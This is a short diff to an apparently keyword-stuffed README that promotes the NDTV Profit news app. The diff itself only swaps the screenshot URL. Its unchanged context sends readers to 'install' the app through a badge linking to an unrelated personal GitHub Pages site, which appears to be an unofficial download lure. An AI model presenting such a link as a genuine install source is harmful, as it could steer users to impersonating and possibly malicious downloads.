@@ -37,7 +37,7 @@ NDTV Profit stock market readers may also use the platform to compare short-term
 
 [![Download NDTV Profit](https://img.shields.io/badge/Download-NDTV_Profit-blueviolet?style=for-the-badge&logo=googleplay&logoColor=white)](https://westgaardjocelyn.github.io/.github/ndtv-profit-app)
 
-![NDTV Profit app screen with business news market updates and live TV coverage](https://c.ndtvimg.com/2023-12/618t9icg_ndtv-profit_624x370_08_December_23.jpg)
+![NDTV Profit app screen with business news market updates and live TV coverage](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT9NrJvHhrUDkc4b4CmfURg4jtkCW6dXrwEiJgQMPfjm4WqXQ4sfp2-Z9uI&s=10)
 
 Install the NDTV Profit app from the block above, open the main news feed, and choose the sections that match your routine. Many readers start with NDTV Profit latest news, then move to NDTV Profit stock market stories, NDTV Profit business news, and ndtv profit live when a major market session is underway.
 
